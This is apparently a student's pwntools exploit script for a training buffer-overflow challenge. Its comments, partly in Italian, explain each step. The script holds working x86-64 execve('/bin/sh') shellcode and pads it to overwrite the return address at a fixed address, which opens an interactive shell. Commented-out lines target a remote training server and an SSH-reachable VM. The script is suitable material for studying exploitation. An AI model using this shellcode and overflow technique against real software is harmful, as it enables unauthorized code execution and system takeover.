from pwn import *

#This is useful for us allowing the program to open a second terminal and show the gdb together.
#tmux is an emulator that allows th split
context.terminal = ['tmux', 'splitw', '-h']

#mode1: r allows us to interact with standard input and output now
r = process("./shellcode")
#mode2: connecting to virtual machine
#ssh = ssh("acidburn", "192.168.56.103")
#r = ssh.process("./shellcode")  leakers
#mode3: connecting to challenge. This is used to running the code remotely
#r = remote("bin.training.jinblack.it", 2001)

#Only for explanation
#r.recv() is what we receive
#r.interactive() instead allows you to interact with the program (shellcode in this case)
#print(r.recv())

gdb.attach(r, """
	b*0x00400729
	c
	""")

#It is required to allow gdb to attach to the program before that the program dies.
#It simply wait for an input from the user.
input("wait")

#mode3
#r = remote("bin.training.jinblack.it", 2001)

#bin/sh\x00 open the shellcode + a \x00 as string terminator
#the last 8 \x00 are a null value che viene utilizzato per riempire i parametri argv ed envp della execve
shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00"

#ljust add bytes with A to complete until 1016
#p64 is used to obtain the little endian from the integer
#the value in p64 is
payload = shellcode.ljust(1016, b"A") + p64(0x601080)

#The b inside the receive until means that it is binary and not unicode. It is necessary.
#In connections we want to deal with bytes and not with unicode. We do not want to encode decode.
r.recvuntil(b"What is your name?\n")
#We have seen that the program can be buffer overflowed to modify the instruction pointer

#r.send(b"A"*2000) allows to send 2000 A characters in response. I can check if 0x41 appears in the instruction pointer. That would mean some of the A has reached that.
#using only A is difficult to recognise. Use a pattern created with cyclic instead. e.g. cyclic 2000
#The standard patter for cyclic is 4 bytes. We can change it to 8 bytes using (cyclic -n 8 2000). Use the pattern instead of all As.
#When you found the pattern check it with cyclyc -n 4 -l 2000 0x(The number found in the Instruction Pointer).
r.send(payload)

r.interactive()


#Code of the binary shellcode
# jmp binsh
# back:
# pop rdi
# mov rsi, rdi
# add rsi, 8
# mov rdx, rsi
# mov rax, 0x3b
# syscall
#
# binsh:
# call back
# nop
# nop